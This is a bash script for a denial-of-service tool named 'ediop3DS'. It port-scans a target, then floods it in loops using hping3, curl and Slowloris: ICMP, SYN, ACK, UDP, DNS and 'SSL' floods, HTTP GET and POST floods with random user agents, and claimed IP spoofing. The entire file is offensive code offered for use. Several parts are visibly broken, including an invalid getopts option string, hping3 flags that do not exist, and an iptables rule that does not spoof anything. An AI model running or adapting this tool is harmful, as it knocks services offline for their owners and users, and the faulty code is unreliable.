#!/bin/bash

# Color definitions
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
WHITE="\e[97m"
RESET="\e[0m"

# Display logo function
display_logo() {
    echo -e "${CYAN}"
    echo -e """
███████╗██████╗░██╗░█████╗░██████╗░██████╗░
██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗
█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝
██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗
███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝
╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░

██████╗░░██████╗
██╔══██╗██╔════╝
██║░░██║╚█████╗░
██║░░██║░╚═══██╗
██████╔╝██████╔╝
╚═════╝░╚═════╝░
"""
    echo -e "${RESET}"
}

# Help function
show_help() {
    display_logo
    echo -e "\nUsage: ./ediop3DS.sh -u target_ip_or_url -p port [options]\n"
    echo -e "${YELLOW}Options:${RESET}"
    echo -e "  -u    Target IP or URL (required)"
    echo -e "  -p    Target Port (default: 80)"
    echo -e "  -h    Show this help message"
    echo -e "  -s    Scan target for open ports before attacking"
    echo -e "  -r    Retry attack without port if no open ports are found"
    echo -e "  -i    Send ICMP ping flood (requires root)"
    echo -e "  -S    Send TCP SYN flood (requires root)"
    echo -e "  -A    Send TCP ACK flood (requires root)"
    echo -e "  -U    Send UDP flood (requires root)"
    echo -e "  -f    Specify a spoofed source IP address"
    echo -e "  -n    Set the number of requests to send (default: 1000)"
    echo -e "  -H    Send custom HTTP headers"
    echo -e "  -v    Enable verbose output"
    echo -e "  -pSize Specify packet size for attacks (default: 56)"
    echo -e "  -sFlag Specify TCP flag (SYN,ACK, etc.)"
    echo -e "  -seq   Specify sequence number for TCP packets"
    echo -e "  -win   Specify window size for TCP packets"
    echo -e "  -proto Specify protocol for attack (TCP, UDP, ICMP, RAW-IP)"
    echo -e "  -P     Specify packet delay (in ms)"
    echo -e "  -l     Perform Slowloris attack with automatic installation detection"
    echo -e "  -t     Target specific attack type (GET, POST, HEAD, SYN, etc.)"
    echo -e "  -F     Test firewall"
    echo -e "  -I    Send DNS Flood attack (requires root)"
    echo -e "  -T    Send HTTP Flood attack (no root)"
    echo -e "  -L    Perform HTTP POST Flood (no root)"
    echo -e "  -M    Send custom TCP packet flood (requires root)"
    echo -e "  -V    Perform SSL DDoS attack (requires root)"
}

# Scan for open ports and handle attacks
scan_ports() {
    target=$1
    echo -e "${CYAN}[*] Scanning for open ports on $target${RESET}"
    open_ports=$(nmap -p- --min-rate=5000 -T4 $target | grep 'open' | awk -F '/' '{print $1}')
    if [ -z "$open_ports" ]; then
        echo -e "${RED}[!] No open ports found.${RESET}"
        return 1
    else
        echo -e "${GREEN}[+] Open ports: $open_ports${RESET}"
        port=$(echo "$open_ports" | head -n 1)
    fi
}

# Function to read user agents from file
read_user_agents() {
    if [ -f "user_agents.txt" ]; then
        mapfile -t user_agents < user_agents.txt
    else
        echo -e "${RED}[!] user_agents.txt not found! Please ensure it's in the same directory.${RESET}"
        exit 1
    fi
}

# Retry attack logic
retry_attack() {
    target=$1
    attack_type="$2"
    attack_func="${attack_type}_flood"
    $attack_func $target
}

# Spoof IP function (for -f flag)
spoof_ip() {
    ip=$1
    echo -e "${CYAN}[*] Spoofing source IP address: $ip${RESET}"
    iptables -t nat -A POSTROUTING -s $ip -j MASQUERADE
}

# Custom HTTP Headers
custom_headers() {
    header=$1
    echo -e "${CYAN}[*] Using custom HTTP header: $header${RESET}"
    curl -s -X GET http://$target -H "$header" > /dev/null 2>&1
}

# ICMP Flood logic
icmp_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting ICMP flood attack on $target${RESET}"
    for ((i=0; i<100000; i++)); do
        hping3 --icmp -p $port $target > /dev/null 2>&1
    done
}

# TCP SYN Flood
syn_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting TCP SYN flood attack on $target${RESET}"
    flags="$sFlag"  # Use specified TCP flags
    for ((i=0; i<100000; i++)); do
        hping3 --syn -p $port --seq $seq --win $win --$flags $target > /dev/null 2>&1
    done
}

# TCP ACK Flood
ack_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting TCP ACK flood attack on $target${RESET}"
    flags="$sFlag"  # Use specified TCP flags
    for ((i=0; i<100000; i++)); do
        hping3 --ack -p $port --seq $seq --win $win --$flags $target > /dev/null 2>&1
    done
}

# UDP Flood
udp_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting UDP flood attack on $target${RESET}"
    for ((i=0; i<100000; i++)); do
        hping3 --udp -p $port $target > /dev/null 2>&1
    done
}

# Send DNS Flood attack
dns_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting DNS flood attack on $target${RESET}"
    for ((i=0; i<100000; i++)); do
        hping3 --dns -p $port $target > /dev/null 2>&1
    done
}

# Perform Slowloris attack with automatic installation detection
check_and_run_slowloris() {
    target=$1
    echo -e "${CYAN}[*] Performing Slowloris attack on $target${RESET}"
    slowloris -d 60 -p $port $target
}

# Test firewall
test_firewall() {
    target=$1
    echo -e "${CYAN}[*] Testing firewall on $target${RESET}"
    nmap -p $port $target
}

# SSL DDoS attack
ssl_ddos() {
    target=$1
    echo -e "${CYAN}[*] Performing SSL DDoS attack on $target${RESET}"
    for ((i=0; i<100000; i++)); do
        hping3 --ssl -p $port $target > /dev/null 2>&1
    done
}

# Custom TCP packet flood
custom_tcp_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting Custom TCP packet flood on $target${RESET}"
    for ((i=0; i<100000; i++)); do
        hping3 --syn -p $port -a $target $target > /dev/null 2>&1
    done
}

# HTTP Flood (GET requests)
http_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting HTTP GET flood attack on $target${RESET}"
    read_user_agents
    for ((i=0; i<100000; i++)); do
        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        curl -s -X GET http://$target -H "User-Agent: $random_ua" > /dev/null 2>&1
    done
}

# HTTP POST Flood
post_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting HTTP POST flood attack on $target${RESET}"
    read_user_agents
    for ((i=0; i<100000; i++)); do
        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        curl -s -X POST http://$target --data "payload" -H "User-Agent: $random_ua" > /dev/null 2>&1
    done
}

# Main function to handle user input
while getopts ":u:p:sirSAtf:n:HvlpSize:sFlag:seq:win:proto:P:l:t:FITLVM" option; do
    case $option in
        u) target="$OPTARG";;
        p) port="$OPTARG";;
        s) scan_ports "$target";;
        i) icmp_flood "$target";;
        r) retry_attack "$target" "$attack_type";;
        S) syn_flood "$target";;
        A) ack_flood "$target";;
        U) udp_flood "$target";;
        f) spoof_ip "$OPTARG";;
        n) num_requests="$OPTARG";;
        H) custom_headers "$OPTARG";;
        v) verbose=1;;
        l) check_and_run_slowloris "$target";;
        t) attack_type="$OPTARG";;
        F) test_firewall "$target";;
        I) dns_flood "$target";;
        T) http_flood "$target";;
        L) post_flood "$target";;
        M) custom_tcp_flood "$target";;
        V) ssl_ddos "$target";;
        *) show_help;;
    esac
done
